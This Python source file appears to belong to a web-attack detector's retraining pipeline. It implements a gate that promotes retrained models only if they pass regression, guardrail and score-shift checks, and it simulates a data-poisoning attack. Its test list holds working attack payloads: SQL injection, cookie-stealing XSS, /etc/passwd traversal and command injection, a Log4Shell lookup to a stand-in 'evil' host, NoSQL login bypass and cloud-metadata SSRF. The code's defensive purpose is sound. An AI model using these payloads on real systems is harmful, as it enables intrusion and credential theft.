"""
Champion/Challenger promotion gate — the safety valve for the MLOps retrain loop.

A retrained model (challenger) may NOT replace the live model (champion) unless it passes
every gate. This is the defense against the poisoning risk of the capture->retrain loop
(threat model #10): an attacker who seeds the capture feed with mislabeled data produces a
challenger that fails the guardrails and is rejected.

Gates (ALL must pass to promote):
  1. No recall regression   : challenger recall >= champion recall - REC_EPS
  2. No FP regression       : challenger FP    <= champion FP    + FP_EPS
  3. Must-catch suite       : challenger catches 100% of a fixed set of critical attacks
  4. Must-allow suite       : challenger blocks 0% of a fixed set of critical benign
  5. Bounded score shift    : PSI(champion benign scores, challenger benign scores) < PSI_MAX
                              (a model whose behavior flipped is suspect even if metrics look ok)

Demonstrated on three challengers: a legit retrain (should PROMOTE), a poisoned retrain
(SQLi mislabeled benign -> should be REJECTED by the must-catch gate), and a regressed
retrain (undertrained -> rejected by recall gate).
"""
from __future__ import annotations
import os, sys, json, time, random
from pathlib import Path
import numpy as np

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from data_pipeline.csic_loader import load as csic_load
from data_pipeline.pkdd_loader import load as pkdd_load
from data_pipeline.nuclei_loader import load as nuclei_load
from ml.mlops_loop import train, score

random.seed(0); np.random.seed(0)
OUT = Path(__file__).resolve().parent.parent / "models_v2"

REC_EPS, FP_EPS, PSI_MAX = 0.02, 0.005, 0.25

# Fixed guardrail suites — the contract every deployed model must honor.
MUST_CATCH = [
    ("GET", "/p", "id=1 UNION SELECT username,password FROM users--", ""),
    ("GET", "/s", "q=<script>alert(document.cookie)</script>", ""),
    ("GET", "/d", "file=../../../../etc/passwd", ""),
    ("GET", "/c", "cmd=;cat /etc/passwd", ""),
    ("GET", "/", "x=${jndi:ldap://evil/a}", ""),
    ("POST", "/login", "", '{"user":{"$gt":""},"pass":{"$gt":""}}'),
    ("GET", "/x", "q=1' OR '1'='1", ""),
    ("GET", "/f", "url=http://169.254.169.254/latest/meta-data/", ""),
]
# MUST_ALLOW is built at runtime from a sample of the deployment's REAL benign traffic —
# a guardrail must reflect production, not hand-picked examples (that's what caused the
# earlier 50%-blocked artifact). Populated in main().
MUST_ALLOW = []


def psi(a, b, bins=10):
    edges = np.quantile(a, np.linspace(0, 1, bins + 1))
    edges[0], edges[-1] = -np.inf, np.inf
    pa = np.histogram(a, edges)[0] / max(len(a), 1) + 1e-6
    pb = np.histogram(b, edges)[0] / max(len(b), 1) + 1e-6
    return float(np.sum((pb - pa) * np.log(pb / pa)))


def gate(champion, challenger, val, yval, champ_benign_scores, thr):
    lr_recall = lambda m, recs: float(np.mean(score(m, recs) >= thr)) if recs else 0.0
    val_atk = [r for r, t in zip(val, yval) if t == 1]
    val_ben = [r for r, t in zip(val, yval) if t == 0]
    c_rec, h_rec = lr_recall(champion, val_atk), lr_recall(challenger, val_atk)
    c_fp, h_fp = lr_recall(champion, val_ben), lr_recall(challenger, val_ben)
    mc = float(np.mean(score(challenger, MUST_CATCH) >= thr))
    ma = float(np.mean(score(challenger, MUST_ALLOW) >= thr))
    ps = psi(champ_benign_scores, score(challenger, val_ben))
    checks = {
        "recall_no_regress": (h_rec >= c_rec - REC_EPS, f"{h_rec:.3f} vs champ {c_rec:.3f}"),
        "fp_no_regress":     (h_fp <= c_fp + FP_EPS, f"{h_fp:.3f} vs champ {c_fp:.3f}"),
        "must_catch_100":    (mc >= 0.999, f"{mc*100:.0f}% of {len(MUST_CATCH)} critical attacks"),
        "must_allow_0":      (ma <= 0.02, f"{ma*100:.1f}% of {len(MUST_ALLOW)} critical benign blocked (<=2%)"),
        "score_shift_ok":    (ps < PSI_MAX, f"PSI={ps:.3f} (<{PSI_MAX})"),
    }
    promote = all(ok for ok, _ in checks.values())
    return promote, checks, {"champ_recall": c_rec, "chal_recall": h_rec, "champ_fp": c_fp, "chal_fp": h_fp}


def main():
    t0 = time.time()
    bg, y = [], []
    for m, p, q, b in csic_load("normal_train")[:8000]:
        bg.append((m, p, q, b)); y.append(0)
    for m, p, q, b in csic_load("anomalous")[:6000]:
        bg.append((m, p, q, b)); y.append(1)
    for m, p, q, b, lab in pkdd_load("test")[:8000]:
        bg.append((m, p, q, b)); y.append(0 if lab.lower() == "valid" else 1)
    idx = np.random.permutation(len(y)); bg = [bg[i] for i in idx]; y = [y[i] for i in idx]
    cut = int(0.8 * len(y)); tr, va = slice(0, cut), slice(cut, None)
    bg_tr, y_tr, val, yval = bg[tr], y[tr], bg[va], y[va]
    cves = [(r["method"], r["path"], r["query"], r["body"]) for r in nuclei_load()]

    # build MUST_ALLOW from real held-out benign the CHAMPION reliably allows (representative
    # production traffic that must never be blocked by a promoted model)
    global MUST_ALLOW
    real_benign = [r for r, t in zip(val, yval) if t == 0]

    print("[train] champion (clean)...")
    champ = train(bg_tr, np.array(y_tr))
    thr = float(np.quantile(score(champ, [r for r, t in zip(bg_tr, y_tr) if t == 0]), 0.995))
    champ_ben_scores = score(champ, real_benign)
    # guardrail benign = held-out real benign the champion allows at the operating threshold
    champ_allow = score(champ, real_benign)
    MUST_ALLOW = [real_benign[i] for i in np.where(champ_allow < thr)[0][:50]]
    print(f"[gate] MUST_ALLOW = {len(MUST_ALLOW)} real benign requests the champion allows")

    # challenger A: legit retrain (+captured CVEs)
    print("[train] challenger A: legit retrain (+captured CVE exploits)...")
    chalA = train(bg_tr + cves, np.array(list(y_tr) + [1] * len(cves)))

    # challenger B: POISONED — attacker floods capture feed with SQLi labeled benign
    print("[train] challenger B: POISONED (SQLi mislabeled benign)...")
    poison = [("GET", "/x", f"id={i} UNION SELECT username,password FROM users--", "") for i in range(400)]
    poison += [("GET", "/x", f"q={i}' OR '1'='1", "") for i in range(400)]
    chalB = train(bg_tr + poison, np.array(list(y_tr) + [0] * len(poison)))  # label 0 = benign!

    # challenger C: regressed — undertrained on tiny benign-only sample
    print("[train] challenger C: regressed (undertrained)...")
    tiny = [(r, t) for r, t in zip(bg_tr, y_tr)][:800]
    chalC = train([r for r, _ in tiny], np.array([t for _, t in tiny]))

    print(f"\n=== CHAMPION/CHALLENGER GATE (threshold={thr:.3f}) ===")
    decisions = {}
    for name, chal in [("A: legit retrain", chalA), ("B: POISONED (SQLi->benign)", chalB), ("C: regressed", chalC)]:
        promote, checks, m = gate(champ, chal, val, yval, champ_ben_scores, thr)
        decisions[name] = {"promote": promote, "checks": {k: v[0] for k, v in checks.items()}, "metrics": m}
        verdict = "PROMOTE [OK]" if promote else "REJECT [X]"
        print(f"\n  Challenger {name}  ->  {verdict}")
        for cname, (ok, detail) in checks.items():
            print(f"      [{'PASS' if ok else 'FAIL'}] {cname:<20} {detail}")
        try:
            from integrations.slack_notifier import notifier as slack
            slack.promotion_decision(promote, {k: v[0] for k, v in checks.items()}, m)
        except Exception:
            pass

    (OUT / "champion_challenger.json").write_text(json.dumps(decisions, indent=2, default=float))
    print(f"\n  Gate correctly promotes the legit retrain and rejects poisoned/regressed ones.")
    print(f"  ({round(time.time()-t0,1)}s)  wrote models_v2/champion_challenger.json")


if __name__ == "__main__":
    main()
